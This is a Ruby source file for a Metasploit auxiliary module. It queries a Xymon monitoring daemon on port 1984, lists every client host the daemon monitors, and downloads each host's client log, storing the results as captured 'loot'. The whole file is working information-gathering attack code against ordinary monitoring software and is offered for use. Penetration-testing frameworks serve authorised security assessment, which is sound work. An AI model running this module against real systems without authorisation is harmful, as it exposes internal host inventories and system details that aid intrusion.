##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Xymon Daemon Gather Client Host Information',
      'Description' => %q{
        This module retrieves a list of monitored hosts
        from a Xymon daemon, and retrieves information
        for each host.
      },
      'Author'      => [ 'bcoles' ],
      'License'     => MSF_LICENSE
    )
    register_options [Opt::RPORT(1984)]
  end

  def xymon_send(cmd)
    vprint_status "Sending: #{cmd}"
    connect
    sock.puts cmd
    sock.shutdown(1)
    return sock.get(5)
  ensure
    disconnect
  end

  def run
    res = xymon_send('ping').to_s

    unless res.starts_with? 'xymond'
      print_error 'Target is not a Xymon daemon'
      return
    end

    version = res.scan(/^xymond ([\d\.]+)/).flatten.first

    unless version
      print_error 'Could not retrieve Xymon version'
    end

    print_status "Xymon daemon version #{version}"

    xymond_service = report_service(host: rhost, port: rport, name: 'xymond', proto: 'tcp', info: version)

    res = xymon_send('hostinfo').to_s

    unless res
      print_error 'Could not retrieve client host list'
    end

    hosts = res.each_line.map {|line| line.split('|').first}.reject {|host| host.blank?}

    if hosts.empty?
      print_error 'Found no client hosts'
      return
    end

    print_good "Found #{hosts.size} hosts"

    hosts.each do |host|
      res = xymon_send("clientlog #{host}")

      unless res
        print_error "Could not retrieve clientlog for #{host}"
        next
      end

      path = store_loot(
        "xymon.hosts.#{host}",
        'text/plain',
        target_host,
        res,
        nil,
        "clientlog #{host}",
        xymond_service
      )
      print_status "Loot stored in #{path}"
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
  rescue Timeout::Error => e
    print_error(e.message)
  end
end
